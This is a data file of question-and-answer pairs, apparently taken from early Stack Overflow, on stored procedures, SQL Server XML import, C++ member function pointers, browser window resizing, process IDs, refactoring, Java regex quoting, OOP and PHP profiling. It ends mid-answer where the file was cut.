{"instruction": "Conventional wisdom states that stored procedures are always faster. So, since they're always faster, use them ALL THE TIME.\nI am pretty sure this is grounded in some historical context where this was once the case. Now, I'm not advocating that Stored Procs are not needed, but I want to know in what cases stored procs are necessary in modern databases such as MySql, SqlServer, Oracle, or . Is it overkill to have ALL access through stored procs?", "output": "It's a debate that rages on and on (for instance, here).\nIt's as easy to write bad stored procedures as it is to write bad data access logic in your app.\nMy preference is for Stored Procs, but that's because I'm typically working with very large and complex apps in an enterprise environment where there are dedicated DBAs who are responsible for keeping the database servers running sweetly.\nIn other situations, I'm happy enough for data access technologies such as LINQ to take care of the optimisation.\nPure performance isn't the only consideration, though. Aspects such as security and configuration management are typically at least as important.\nEdit: While Frans Bouma's article is indeed verbose, it misses the point with regard to security by a mile. The fact that it's 5 years old doesn't help its relevance, either."}
{"instruction": "Conventional wisdom states that stored procedures are always faster. So, since they're always faster, use them ALL THE TIME.\nI am pretty sure this is grounded in some historical context where this was once the case. Now, I'm not advocating that Stored Procs are not needed, but I want to know in what cases stored procs are necessary in modern databases such as MySql, SqlServer, Oracle, or . Is it overkill to have ALL access through stored procs?", "output": "I prefer to use SP's when it makes sense to use them.  In SQL Server anyway there is no performance advantage to SP's over a parametrized query.\nHowever, at my current job my boss mentioned that we are forced to use SP's because our customer's require them.  They feel that they are more secure.  I have not been here long enough to see if we are implementing role based security but I have a feeling we do.\nSo the customer's feelings trump all other arguments in this case."}
{"instruction": "I have been hearing the podcast blog for a while, I hope I dont break this. \nThe question is this: I have to insert an xml to a database. This will be for already defined tables and fields. So what is the best way to accomplish this? So far I am leaning toward programatic. I have been seeing varios options, one is Data Transfer Objects (DTO), in the SQL Server there is the sp_xml_preparedocument that is used to get transfer XMLs to an object and throught code. \nI am using CSharp and SQL Server 2005. The fields are not XML fields, they are the usual SQL datatypes.", "output": "Peruse this document and it will give you the options:\nMSDN: XML Options in Microsoft SQL Server 2005"}
{"instruction": "Conventional wisdom states that stored procedures are always faster. So, since they're always faster, use them ALL THE TIME.\nI am pretty sure this is grounded in some historical context where this was once the case. Now, I'm not advocating that Stored Procs are not needed, but I want to know in what cases stored procs are necessary in modern databases such as MySql, SqlServer, Oracle, or . Is it overkill to have ALL access through stored procs?", "output": "There is no noticeable speed difference for stored procedures vs parameterized or prepared queries on most modern databases, because the database will also cache execution plans for those queries.  \nNote that a parameterized query is not the same as ad hoc sql.\nThe main reason imo to still favor stored procedures today has more to do with security.  If you use stored procedures exclusively, you can disable INSERT, SELECT, UPDATE, DELETE, ALTER, DROP, and CREATE etc permissions for your application's user, only leaving it with EXECUTE.  \nThis provides a little extra protection against 2nd order sql injection.  Parameterized queries only protect against 1st order injection."}
{"instruction": "Conventional wisdom states that stored procedures are always faster. So, since they're always faster, use them ALL THE TIME.\nI am pretty sure this is grounded in some historical context where this was once the case. Now, I'm not advocating that Stored Procs are not needed, but I want to know in what cases stored procs are necessary in modern databases such as MySql, SqlServer, Oracle, or . Is it overkill to have ALL access through stored procs?", "output": "Obviously, actual performance ought to be measured in individual cases, not assumed.  But even in cases where performance is hampered by a stored procedure, there are good reasons to use them:\n\nApplication developers aren't always the best SQL coders.  Stored procedures hides SQL from the application.\nStored procedures automatically use bind variables.  Application developers often avoid bind variables because they seem like unneeded code and show little benefit in small test systems.  Later on, the failure to use bind variables can throttle RDBMS performance.\nStored procedures create a layer of indirection that might be useful later on.  It's possible to change implementation details (including table structure) on the database side without touching application code.\nThe exercise of creating stored procedures can be useful for documenting all database interactions for a system.  And it's easier to update the documentation when things change.\n\nThat said, I usually stick raw SQL in my applications so that I can control it myself.  It depends on your development team and philosophy."}
{"instruction": "Conventional wisdom states that stored procedures are always faster. So, since they're always faster, use them ALL THE TIME.\nI am pretty sure this is grounded in some historical context where this was once the case. Now, I'm not advocating that Stored Procs are not needed, but I want to know in what cases stored procs are necessary in modern databases such as MySql, SqlServer, Oracle, or . Is it overkill to have ALL access through stored procs?", "output": "NOTE that this is a general look at stored procedures not regulated to a specific\n  DBMS. Some DBMS (and even, different\n  versions of the same DBMS!) may operate\n  contrary to this, so you'll want to\n  double-check with your target DBMS\n  before assuming all of this still holds.\nI've been a Sybase ASE, MySQL, and SQL Server DBA on-and off since for almost a decade (along with application development in C, PHP, PL/SQL, C#.NET, and Ruby). So, I have no particular axe to grind in this (sometimes) holy war.\n\nThe historical performance benefit of stored procs have generally been from the following (in no particular order):\n\nPre-parsed SQL\nPre-generated query execution plan\nReduced network latency\nPotential cache benefits\n\nPre-parsed SQL -- similar benefits to compiled vs. interpreted code, except on a very micro level. \nStill an advantage? \nNot very noticeable at all on the modern CPU, but if you are sending a single SQL statement that is VERY large eleventy-billion times a second, the parsing overhead can add up.\nPre-generated query execution plan. \nIf you have many JOINs the permutations can grow quite unmanageable (modern optimizers have limits and cut-offs for performance reasons). It is not unknown for very complicated SQL to have distinct, measurable (I've seen a complicated query take 10+ seconds just to generate a plan, before we tweaked the DBMS) latencies due to the optimizer trying to figure out the \"near best\" execution plan. Stored procedures will, generally, store this in memory so you can avoid this overhead.\nStill an advantage? \nMost DBMS' (the latest editions) will cache the query plans for INDIVIDUAL SQL statements, greatly reducing the performance differential between stored procs and ad hoc SQL. There are some caveats and cases in which this isn't the case, so you'll need to test on your target DBMS.\nAlso, more and more DBMS allow you to provide optimizer path plans (abstract query plans) to significantly reduce optimization time (for both ad hoc and stored procedure SQL!!).\n\nWARNING Cached query plans are not a performance panacea. Occasionally the query plan that is generated is sub-optimal.\n  For example, if you send SELECT *\n  FROM table WHERE id BETWEEN 1 AND\n  99999999, the DBMS may select a\n  full-table scan instead of an index\n  scan because you're grabbing every row\n  in the table (so sayeth the\n  statistics). If this is the cached\n  version, then you can get poor\n  performance when you later send\n  SELECT * FROM table WHERE id BETWEEN\n  1 AND 2. The reasoning behind this is\n  outside the scope of this posting, but\n  for further reading see:\n  http://www.microsoft.com/technet/prodtechnol/sql/2005/frcqupln.mspx\n  and\n  http://msdn.microsoft.com/en-us/library/ms181055.aspx\n  and http://www.simple-talk.com/sql/performance/execution-plan-basics/\n\"In summary, they determined that\n  supplying anything other than the\n  common values when a compile or\n  recompile was performed resulted in\n  the optimizer compiling and caching\n  the query plan for that particular\n  value. Yet, when that query plan was\n  reused for subsequent executions of\n  the same query for the common values\n  (\u2018M\u2019, \u2018R\u2019, or \u2018T\u2019), it resulted in\n  sub-optimal performance. This\n  sub-optimal performance problem\n  existed until the query was\n  recompiled. At that point, based on\n  the @P1 parameter value supplied, the\n  query might or might not have a\n  performance problem.\"\n\nReduced network latency\nA) If you are running the same SQL over and over -- and the SQL adds up to many KB of code -- replacing that with a simple \"exec foobar\" can really add up.\nB) Stored procs can be used to move procedural code into the DBMS. This saves shuffling large amounts of data off to the client only to have it send a trickle of info back (or none at all!). Analogous to doing a JOIN in the DBMS vs. in your code (everyone's favorite WTF!)\nStill an advantage?\nA) Modern 1Gb (and 10Gb and up!) Ethernet really make this negligible. \nB) Depends on how saturated your network is -- why shove several megabytes of data back and forth for no good reason?\nPotential cache benefits\nPerforming server-side transforms of data can potentially be faster if you have sufficient memory on the DBMS and the data you need is in memory of the server.\nStill an advantage?\nUnless your app has shared memory access to DBMS data, the edge will always be to stored procs.\nOf course, no discussion of Stored Procedure optimization would be complete without a discussion of parameterized and ad hoc SQL.\nParameterized / Prepared SQL\nKind of a cross between stored procedures and ad hoc SQL, they are embedded SQL statements in a host language that uses \"parameters\" for query values, e.g.:\nSELECT .. FROM yourtable WHERE foo = ? AND bar = ?\n\nThese provide a more generalized version of a query that modern-day optimizers can use to cache (and re-use) the query execution plan, resulting in much of the performance benefit of stored procedures.\nAd Hoc SQL\nJust open a console window to your DBMS and type in a SQL statement. In the past, these were the \"worst\" performers (on average) since the DBMS had no way of pre-optimizing the queries as in the parameterized/stored proc method.\nStill a disadvantage?\nNot necessarily. Most DBMS have the ability to \"abstract\" ad hoc SQL into parameterized versions -- thus more or less negating the difference between the two. Some do this implicitly or must be enabled with a command setting (SQL server: http://msdn.microsoft.com/en-us/library/ms175037.aspx , Oracle: http://www.praetoriate.com/oracle_tips_cursor_sharing.htm).\nLessons learned?\nMoore's law continues to march on and DBMS optimizers, with every release, get more sophisticated. Sure, you can place every single silly teeny SQL statement inside a stored proc, but just know that the programmers working on optimizers are very smart and are continually looking for ways to improve performance. Eventually (if it's not here already) ad hoc SQL performance will become indistinguishable (on average!) from stored procedure performance, so any sort of massive stored procedure use ** solely for \"performance reasons\"** sure sounds like premature optimization to me.\nAnyway, I think if you avoid the edge cases and have fairly vanilla SQL, you won't notice a difference between ad hoc and stored procedures."}
{"instruction": "Conventional wisdom states that stored procedures are always faster. So, since they're always faster, use them ALL THE TIME.\nI am pretty sure this is grounded in some historical context where this was once the case. Now, I'm not advocating that Stored Procs are not needed, but I want to know in what cases stored procs are necessary in modern databases such as MySql, SqlServer, Oracle, or . Is it overkill to have ALL access through stored procs?", "output": "Using stored procedures for CRUD operations is probably overkill, but it will depend on the tools be used and your own preferences (or requirements).  I prefer inline SQL, but I make sure to use parameterized queries to prevent SQL injection attacks.  I keep a print out of this xkcd comic as a reminder of what can go wrong if you are not careful.\nStored procedures can have real performance benefits when you are working with multiple sets of data to return a single set of data.  It's usually more efficient to process sets of data in the stored procedure than sending them over the wire to be processed at the client end."}
{"instruction": "Conventional wisdom states that stored procedures are always faster. So, since they're always faster, use them ALL THE TIME.\nI am pretty sure this is grounded in some historical context where this was once the case. Now, I'm not advocating that Stored Procs are not needed, but I want to know in what cases stored procs are necessary in modern databases such as MySql, SqlServer, Oracle, or . Is it overkill to have ALL access through stored procs?", "output": "Yes, they are faster most of time. SQL composition is a huge performance tuning area too. If I am doing a back office type app I may skip them but anything production facing I use them for sure for all the reasons others spoke too...namely security."}
{"instruction": "In C++, can member function pointers be used to point to derived (or even base) class members? \nEDIT: \nPerhaps an example will help. Suppose we have a hierarchy of three classes X, Y, Z in order of inheritance. \nY therefore has a base class X and a derived class Z.\nNow we can define a member function pointer p for class Y. This is written as:\nvoid (Y::*p)();\n\n(For simplicity, I'll assume we're only interested in functions with the signature void f() )  \nThis pointer p can now be used to point to member functions of class Y.\nThis question (two questions, really) is then:\n\nCan p be used to point to a function in the derived class Z?\nCan p be used to point to a function in the base class X?", "output": "I believe so.  Since the function pointer uses the signature to identify itself, the base/derived behavior would rely on whatever object you called it on."}
{"instruction": "In C++, can member function pointers be used to point to derived (or even base) class members? \nEDIT: \nPerhaps an example will help. Suppose we have a hierarchy of three classes X, Y, Z in order of inheritance. \nY therefore has a base class X and a derived class Z.\nNow we can define a member function pointer p for class Y. This is written as:\nvoid (Y::*p)();\n\n(For simplicity, I'll assume we're only interested in functions with the signature void f() )  \nThis pointer p can now be used to point to member functions of class Y.\nThis question (two questions, really) is then:\n\nCan p be used to point to a function in the derived class Z?\nCan p be used to point to a function in the base class X?", "output": "You might want to check out this article Member Function Pointers and the Fastest Possible C++ Delegates  The short answer seems to be yes, in some cases."}
{"instruction": "I run a rather complex project with several independent applications. These use however a couple of shared components. So I have a source tree looking something like the below.\n\nMy Project \n\nApplication A\nShared1\nShared2 \nApplication B \nApplication C\n\n\nAll applications have their own MSBuild script that builds the project and all the shared resources it needs. I also run these builds on a CruiseControl controlled continuous integration build server. \nWhen the applications are deployed they are deployed on several servers to distribute load. This means that it\u2019s extremely important to keep track of what build/revision is deployed on each of the different servers (we need to have the current version in the DLL version, for example \u201c1.0.0.68\u201d). \nIt\u2019s equally important to be able to recreate a revision/build that been built to be able to roll back if something didn\u2019t work out as intended (o yes, that happends ...). Today we\u2019re using SourceSafe for source control but that possible to change if we could present good reasons for that (SS it\u2019s actually working ok for us so far). \nAnother principle that we try to follow is that it\u2019s only code that been build and tested by the integration server that we deploy further. \n\"CrusieControl Build Labels\" solution\nWe had several ideas on solving the above. The first was to have the continuous integration server build and locally deploy the project and test it (it does that now). As you probably know a successful build in CruiseControl generates a build label and I guess we somehow could use that to set the DLL version of our executables (so build label 35 would create a DLL like \u201c1.0.0.35\u201d )? The idea was also to use this build label to label the complete source tree. Then we probably could check out by that label and recreate the build later on. \nThe reason for labeling the complete tree is to include not only the actual application code (that\u2019s in one place in the source tree) but also all the shared items (that\u2019s in different places in the tree). So a successful build of \u201cApplication A\u201d would label to whole tree with label \u201cApplicationA35\u201d for example. \nThere might however be an issue when trying to recreate this build and setting the DLL version before deploying as we then don\u2019t have access to the CruiseControl generated build label anymore. If all CrusieControl build labels were unique for all the projects we could use only the number for labeling but that\u2019s not the case (both application A and B could at the same time be on build 35) so we have to include the application name in the label. Hence SourceSafe label \u201cApplication35\u201d. How can I then recreate build 34 and set 1.0.0.34 to the DLL version numbers once we built build 35?\n\"Revision number\" solution\nSomeone told me that Subversion for example creates a revision number for the entire source tree on every check in \u2013 is this the case? Has SourceSafe something similar? If this is correct the idea is then to grab that revision number when getting latest and build on the CruiseControl server. The revision number could then be used to set the DLL version number (to for example \u201c1.0.0.5678\u201d). I guess we could then get this specific revision for the Subversion if needed and that then would include that application and all the shared items to be able to recreate a specific version from the past. Would that work and could this also be achived using SourceSafe?\nSummarize\nSo the two main requirements are:\n\nBe able to track build/revision number of the build and deployed DLL.\nBe able to rebuild a past revision/build, set the old build/revision number on the executables of that build (to comply with requirement 1).\n\nSo how would you solve this? What would be your preferred approach and how would you solve it (or do you have a totally different idea?)? **Pleased give detailed answers. **\nBonus question What are the difference between a revision number and a build number and when would one really need both?", "output": "I need more space than responding as comments directly allows...\n\nThanks! Good answer! What would be the\n  difference, what would be better\n  solving this using SubVersion for\n  example?Richard Hallgren (15 hours\n  ago)\n\nThe problems with VSS have nothing to do with this example (although the \"Labeling\" feature I believe is implemented inefficiently...)\nHere are a few of the issues with VSS \n1) Branching is basically impossible\n2) Shared checkout is generally not used (I know of a few people who have had success with it)\n3) performance is very poor - it is exteremly \"chatty\"\n4) unless you have a very small repository - it is completely unreliable, to the point for most shops it's a ticking timebomb.\nFor 4 - the problem is that VSS is implemented by the entire repository being represented as \"flat files\" in the file system.  When the repository gets over a certain size (I believe 4GB but I'm not confident in that figure) you get a chance for \"corruption\".  As the size increases the chances of corruption grow until it becomes an almost certainty.\nSo take a look at your repository size - and if you are getting into the Gigabytes - I'd strongly recommend you begin planning on replacing VSS.\nRegardless - a google of \"VSS Sucks\" gives 30K hits...  I think if you did start using an alterantive - you will realize it's well worth the effort."}
{"instruction": "In C++, can member function pointers be used to point to derived (or even base) class members? \nEDIT: \nPerhaps an example will help. Suppose we have a hierarchy of three classes X, Y, Z in order of inheritance. \nY therefore has a base class X and a derived class Z.\nNow we can define a member function pointer p for class Y. This is written as:\nvoid (Y::*p)();\n\n(For simplicity, I'll assume we're only interested in functions with the signature void f() )  \nThis pointer p can now be used to point to member functions of class Y.\nThis question (two questions, really) is then:\n\nCan p be used to point to a function in the derived class Z?\nCan p be used to point to a function in the base class X?", "output": "I'm not 100% sure what you are asking, but here is an example that works with virtual functions:\n#include <iostream>\nusing namespace std;\n\nclass A { \npublic:\n    virtual void foo() { cout << \"A::foo\\n\"; }\n};\nclass B : public A {\npublic:\n    virtual void foo() { cout << \"B::foo\\n\"; }\n};\n\nint main()\n{\n    void (A::*bar)() = &A::foo;\n    (A().*bar)();\n    (B().*bar)();\n    return 0;\n}"}
{"instruction": "I found a bug in the Contains statement in Linq (not sure if it is really in Linq or Linq to SQL) and want to know if anyone else has seen this and if there is a fix or workaround.\nIf the querysource you do the contains with has more than 10 items in it, it does not pass the items correctly to the SQL query. It is hard to explain what it does, an example will show it best.\nIf you look at the raw query, the parameters look like this:\n@P0 = 'aaa'\n@P1 = 'bbb'\n@P2 = 'ccc'\n... [@P3 through @P9]\n@P10 = '111'\n@P11 = '222'\n... [@p12 through @P19]\n@P20 = 'sss'\n... [@P21 through @P99]\n@P100 = 'qqq'\n\nwhen the values are passed into the final query (all parameters resolved) it has resolved the parameters as if these were the values passed:\n@P0 = 'aaa'\n@P1 = 'bbb'\n@P2 = 'ccc'\n...\n@P10 = 'bbb'0\n@P11 = 'bbb'1\n...\n@P20 = 'ccc'0\n...\n@P100 = 'bbb'00\n\nSo it looks like the parameter resolving looks at the first digit only after the @P and resolves that, then adds on anything left at the end of the parameter name.\nAt least that is what the Sql Server Query Visualizer plugin to Visual Studio shows the query doing.\nReally strange.\nSo if any one has advice please share. Thanks!\nUpdate:\nI have rewritten the original linq statement to where I now use a join instead of the Contains, but would still like to know if there is a way around this issue.", "output": "Try actually looking at the output from your datacontext before you pass judgement.\nDataContext.Log() will give you the generated SQL."}
{"instruction": "In Firefox you can enter the following into the awesome bar and hit enter:\njavascript:self.resizeTo(1024,768);\n\nHow do you do the same thing in IE?", "output": "Try:\njavascript:resizeTo(1024,768);\n\nThis works in IE7 at least."}
{"instruction": "In Firefox you can enter the following into the awesome bar and hit enter:\njavascript:self.resizeTo(1024,768);\n\nHow do you do the same thing in IE?", "output": "It works in IE6, but I think IE7 added some security around this?"}
{"instruction": "In Firefox you can enter the following into the awesome bar and hit enter:\njavascript:self.resizeTo(1024,768);\n\nHow do you do the same thing in IE?", "output": "Maybe not directly related if you were looking for only a JavaScript solution but you can use the free Windows utility Sizer to automatically resize any (browser) window to a predefined size like 800x600, 1024,768, etc."}
{"instruction": "In Firefox you can enter the following into the awesome bar and hit enter:\njavascript:self.resizeTo(1024,768);\n\nHow do you do the same thing in IE?", "output": "Your code works in IE, you just need to \"Allow blocked Content\" in the Security Toolbar"}
{"instruction": "I am currently in an operating systems class and my teacher spent half of the class period talking about PIDs. She mentioned, as many know, that processes know their parent's ID.\nMy question is this:\nDoes a process's PCB know its child's ID? If so, what is the way to go about it obtaining it?", "output": "When you use fork() on *nix, the return value is the PID of the child in the parent process, and 0 in the child process. That's one way to find out.\nNot sure if they keep track of the \"tree\" of process spawning, I think it depends on what OS you use, but since when you kill bash (or any shell), all running children are also killed, I think UNIX like systems do keep track of this."}
{"instruction": "I am currently in an operating systems class and my teacher spent half of the class period talking about PIDs. She mentioned, as many know, that processes know their parent's ID.\nMy question is this:\nDoes a process's PCB know its child's ID? If so, what is the way to go about it obtaining it?", "output": "As far as I know a process doesn't have an explicit list of its children's PIDs, but it can easily be built, since a process should know which child processes it spawns. For example the UNIX fork() call returns the child PID in the parent process and 0 in the child process, CreateProcess() on Windows returns (IIRC) the PID of the new process created."}
{"instruction": "I am currently in an operating systems class and my teacher spent half of the class period talking about PIDs. She mentioned, as many know, that processes know their parent's ID.\nMy question is this:\nDoes a process's PCB know its child's ID? If so, what is the way to go about it obtaining it?", "output": "If you're using Linux or anything which implements the Unix APIs, when a process calls fork() to create a child process the parent receives the child PID as the return code, or -1 if the fork failed. The child process gets a zero return code."}
{"instruction": "I've just coded a 700 line class. Awful. I hang my head in shame.  It's as opposite to DRY as a British summer.\nIt's full of cut and paste with minor tweaks here and there.  This makes it's a prime candidate for refactoring.  Before I embark on this, I'd thought I'd ask when you have lots of repetition, what are the first refactoring opportunities you look for?\nFor the record, mine are probably using:\n\nGeneric classes and methods\nMethod overloading/chaining.\n\nWhat are yours?", "output": "#region\nI made a 1,000 line class only one line with it!\nIn all seriousness, the best way to avoid repetition is the things covered in your list, as well as fully utilizing polymorphism, examine your class and discover what would best be done in a base class, and how different components of it can be broken away a subclasses."}
{"instruction": "I've just coded a 700 line class. Awful. I hang my head in shame.  It's as opposite to DRY as a British summer.\nIt's full of cut and paste with minor tweaks here and there.  This makes it's a prime candidate for refactoring.  Before I embark on this, I'd thought I'd ask when you have lots of repetition, what are the first refactoring opportunities you look for?\nFor the record, mine are probably using:\n\nGeneric classes and methods\nMethod overloading/chaining.\n\nWhat are yours?", "output": "First of all, I would recommend refactoring much sooner than when you are done with the first version of the class.  Anytime you see duplication, eliminate it ASAP.  This may take a little longer initially, but I think the results end up being a lot cleaner, and it helps you rethink your code as you go to ensure you are doing things right.\nAs for my favorite way of removing duplication.... Closures, especially in my favorite language (Ruby).  They tend to be a really concise way of taking 2 pieces of code and merging the similarities.  Of course (like any \"best practice\" or tip), this can not be blindly done... I just find them really fun to use when I can use them."}
{"instruction": "I've just coded a 700 line class. Awful. I hang my head in shame.  It's as opposite to DRY as a British summer.\nIt's full of cut and paste with minor tweaks here and there.  This makes it's a prime candidate for refactoring.  Before I embark on this, I'd thought I'd ask when you have lots of repetition, what are the first refactoring opportunities you look for?\nFor the record, mine are probably using:\n\nGeneric classes and methods\nMethod overloading/chaining.\n\nWhat are yours?", "output": "One of the things I do, is try to make small and simple methods that I can see on a single page in my editor (visual studio).\nI've learnt from experience that making code simple makes it easier for the compiler to optimise it. The larger the method, the harder the compiler has to work!\nI've also recently seen a problem where large methods have caused a memory leak. Basically I had a loop very much like the following:\n\nwhile (true)\n{\n  var smallObject = WaitForSomethingToTurnUp();\n  var largeObject = DoSomethingWithSmallObject();\n}\n\nI was finding that my application was keeping a large amount of data in memory because even though 'largeObject' wasn't in scope until smallObject returned something, the garbage collector could still see it.\nI easily solved this by moving the 'DoSomethingWithSmallObject()' and other associated code to another method.\nAlso, if you make small methods, your reuse within a class will become significantly higher. I generally try to make sure that none of my methods look like any others!\nHope this helps.\nNick"}
{"instruction": "I have been hearing the podcast blog for a while, I hope I dont break this. \nThe question is this: I have to insert an xml to a database. This will be for already defined tables and fields. So what is the best way to accomplish this? So far I am leaning toward programatic. I have been seeing varios options, one is Data Transfer Objects (DTO), in the SQL Server there is the sp_xml_preparedocument that is used to get transfer XMLs to an object and throught code. \nI am using CSharp and SQL Server 2005. The fields are not XML fields, they are the usual SQL datatypes.", "output": "In an attempt to try and help, we may need some clarification. Maybe by restating the problem you can let us know if this is what you're asking:\nHow can one import existing xml into a SQL 2005 database, without relying on the built-in xml type?\nA fairly straight forward solution that you already mentioned is the sp_xml_preparedocument, combined with openxml. \nHopefully the following example illustrates the correct usage. For a more complete example checkout the MSDN docs on Using OPENXML.\ndeclare @XmlDocumentHandle int\ndeclare @XmlDocument nvarchar(1000)\nset @XmlDocument = N'<ROOT>\n<Customer>\n   <FirstName>Will</FirstName>\n   <LastName>Smith</LastName>\n</Customer>\n</ROOT>'\n\n-- Create temp table to insert data into\ncreate table #Customer \n( \n    FirstName varchar(20),\n    LastName varchar(20) \n)\n-- Create an internal representation of the XML document.\nexec sp_xml_preparedocument @XmlDocumentHandle output, @XmlDocument\n\n-- Insert using openxml allows us to read the structure\ninsert into #Customer\nselect \n    FirstName = XmlFirstName,\n    LastName = XmlLastName\nfrom openxml ( @XmlDocumentHandle, '/ROOT/Customer',2 )\nwith \n(\n    XmlFirstName  varchar(20) 'FirstName',\n    XmlLastName varchar(20) 'LastName'\n)\nwhere ( XmlFirstName = 'Will' and XmlLastName = 'Smith' )\n\n-- Cleanup xml document\nexec sp_xml_removedocument @XmlDocumentHandle\n\n-- Show the data\nselect * \nfrom #Customer\n\n-- Drop tmp table\ndrop table #Customer\n\nIf you have an xml file and are using C#, then defining a stored procedure that does something like the above and then passing the entire xml file contents to the stored procedure as a string should give you a fairly straight forward way of importing xml into your existing table(s)."}
{"instruction": "Does Java have a built-in way to escape arbitrary text so that it can be included in a regular expression? For example, if my users enter \"$5\", I'd like to match that exactly rather than a \"5\" after the end of input.", "output": "Since Java 1.5, yes:\nPattern.quote(\"$5\");"}
{"instruction": "Does Java have a built-in way to escape arbitrary text so that it can be included in a regular expression? For example, if my users enter \"$5\", I'd like to match that exactly rather than a \"5\" after the end of input.", "output": "I think what you're after is \\Q$5\\E.  Also see Pattern.quote(s) introduced in Java5.\nSee Pattern javadoc for details."}
{"instruction": "Does Java have a built-in way to escape arbitrary text so that it can be included in a regular expression? For example, if my users enter \"$5\", I'd like to match that exactly rather than a \"5\" after the end of input.", "output": "Difference between Pattern.quote and Matcher.quoteReplacement was not clear to me before I saw following example\ns.replaceFirst(Pattern.quote(\"text to replace\"), \n               Matcher.quoteReplacement(\"replacement text\"));"}
{"instruction": "As far as I can tell, in spite of the countless millions or billions spent on OOP education, languages, and tools, OOP has not improved developer productivity or software reliability, nor has it reduced development costs. Few people use OOP in any rigorous sense (few people adhere to or understand principles such as LSP); there seems to be little uniformity or consistency to the approaches that people take to modelling problem domains.  All too often, the class is used simply for its syntactic sugar; it puts the functions for a record type into their own little namespace.\nI've written a large amount of code for a wide variety of applications. Although there have been places where true substitutable subtyping played a valuable role in the application, these have been pretty exceptional. In general, though much lip service is given to talk of \"re-use\" the reality is that unless a piece of code does exactly what you want it to do, there's very little cost-effective \"re-use\".  It's extremely hard to design classes to be extensible in the right way, and so the cost of extension is normally so great that \"re-use\" simply isn't worthwhile.\nIn many regards, this doesn't surprise me.  The real world isn't \"OO\", and the idea implicit in OO--that we can model things with some class taxonomy--seems to me very fundamentally flawed (I can sit on a table, a tree stump, a car bonnet, someone's lap--but not one of those is-a chair).  Even if we move to more abstract domains, OO modelling is often difficult, counterintuitive, and ultimately unhelpful (consider the classic examples of circles/ellipses or squares/rectangles).\nSo what am I missing here? Where's the value of OOP, and why has all the time and money failed to make software any better?", "output": "Reuse shouldn't be a goal of OOP - or any other paradigm for that matter.\nReuse is a side-effect of an good design and proper level of abstraction.  Code achieves reuse by doing something useful, but not doing so much as to make it inflexible.  It does not matter whether the code is OO or not - we reuse what works and is not trivial to do ourselves.  That's pragmatism.\nThe thought of OO as a new way to get to reuse through inheritance is fundamentally flawed.  As you note the LSP violations abound.  Instead, OO is properly thought of as a method of managing the complexity of a problem domain.  The goal is maintainability of a system over time.  The primary tool for achieving this is the separation of public interface from a private implementation.  This allows us to have rules like \"This should only be modified using ...\" enforced by the compiler, rather than code review.\nUsing this, I'm sure you will agree, allows us to create and maintain hugely complex systems.  There is lots of value in that, and it is not easy to do in other paradigms."}
{"instruction": "I've just coded a 700 line class. Awful. I hang my head in shame.  It's as opposite to DRY as a British summer.\nIt's full of cut and paste with minor tweaks here and there.  This makes it's a prime candidate for refactoring.  Before I embark on this, I'd thought I'd ask when you have lots of repetition, what are the first refactoring opportunities you look for?\nFor the record, mine are probably using:\n\nGeneric classes and methods\nMethod overloading/chaining.\n\nWhat are yours?", "output": "\"cut and paste with minor tweaks here and there\" is the kind of code repetition I usually solve with an entirely non-exotic approach-  Take the similar chunk of code, extract it out to a seperate method.  The little bit that is different in every instance of that block of code, change that to a parameter.\nThere's also some easy techniques for removing repetitive-looking if/else if and switch blocks, courtesy of Scott Hanselman:\nhttp://www.hanselman.com/blog/CategoryView.aspx?category=Source+Code&page=2"}
{"instruction": "Here's my first question at SO.\nI have a internal application for my company which I've been recently ask to maintain. The applications is built in PHP and its fairly well coded (OO, DB Abstraction, Smarty) nothing WTF-ish. \nThe problem is the applications is very slow.\nHow do I go about finding out what's slowing the application down? I've optimized the code to make very few DB queries, so I know that it is the PHP code which is taking a while to execute. I need to get some tools which can help me with this and need to devise a strategy for checking my code.\nI can do the checking/strategy work myself, but I need more PHP tools to figure out where my app is crapping up. \nThoughts?", "output": "Xdebug profile is definitely the way to go.  Another tip - WincacheGrind is good, but not been updated recently.  http://code.google.com/p/webgrind/ - in a browser may be an easy and quick alternative.\nChances are though, it's still the database anyway.  Check for relevant indexes - and that it has sufficient memory to cache as much of the working data as possible."}
{"instruction": "In Firefox you can enter the following into the awesome bar and hit enter:\njavascript:self.resizeTo(1024,768);\n\nHow do you do the same thing in IE?", "output": "javascript:resizeTo(1024,768);\nvbscript:resizeto(1024,768)\nWill work in IE7, But consider using something like\njavascript:moveTo(0,0);resizeTo(1024,768);\nbecause IE7 doesn't allow the window to \"resize\" beyond the screen borders. If you work on a 1024,768 desktop, this is what happens...Firefox: 1024x768 Window, going behind the taskbar. If you drop the moveTo part, the top left corner of the window won't change position.(You still get a 1024x768 window)\nIE7: As close as possible to the requested size without obscuring the taskbar or allowing any part of the window to lie beyond the screen borders.\nsafari: As close as possible to the requested size without obscuring the taskbar or allowing any part of the window to lie beyond the screen borders, but you can ommit the moveTo part. Safari will move the top left corner of the window for you.\nOpera: Nothing happens.\nChrome: Nothing happens."}
{"instruction": "I've just coded a 700 line class. Awful. I hang my head in shame.  It's as opposite to DRY as a British summer.\nIt's full of cut and paste with minor tweaks here and there.  This makes it's a prime candidate for refactoring.  Before I embark on this, I'd thought I'd ask when you have lots of repetition, what are the first refactoring opportunities you look for?\nFor the record, mine are probably using:\n\nGeneric classes and methods\nMethod overloading/chaining.\n\nWhat are yours?", "output": "I might go something like this:\nCreate custom (private) types for data structures and put all the related logic in there. Dictionary<string, List<int>> etc.\nMake inner functions or properties that guarantee behaviour. If you\u2019re continually checking conditions from a publically accessible property then create an private getter method with all of the checking baked in.\nSplit methods apart that have too much going on. If you can\u2019t put something succinct into the  or give it a good name, then start breaking the function apart until the code is (even if these \u201cchild\u201d functions aren\u2019t used anywhere else). \nIf all else fails, slap a [SuppressMessage(\"Microsoft.Maintainability\", \"CA1502:AvoidExcessiveComplexity\")] on it and comment why."}
{"instruction": "I've just coded a 700 line class. Awful. I hang my head in shame.  It's as opposite to DRY as a British summer.\nIt's full of cut and paste with minor tweaks here and there.  This makes it's a prime candidate for refactoring.  Before I embark on this, I'd thought I'd ask when you have lots of repetition, what are the first refactoring opportunities you look for?\nFor the record, mine are probably using:\n\nGeneric classes and methods\nMethod overloading/chaining.\n\nWhat are yours?", "output": "I like to start refactoring when I need to, rather than the first opportunity that I get. You might say this is somewhat of an agile approach to refactoring. When do I feel I need to? Usually when I feel that the ugly parts of my codes are starting to spread. I think ugliness is okay as long as they are contained, but the moment when they start having the urge to spread, that's when you need to take care of business. \nThe techniques you use for refactoring should start with the simplest. I would strongly recommand Martin Fowler's book. Combining common code into functions, removing unneeded variables, and other simple techniques gets you a lot of mileage. For list operations, I prefer using functional programming idioms. That is to say, I use internal iterators, map, filter and reduce(in python speak, there are corresponding things in ruby, lisp and haskell) whenever I can, this makes code a lot shorter and more 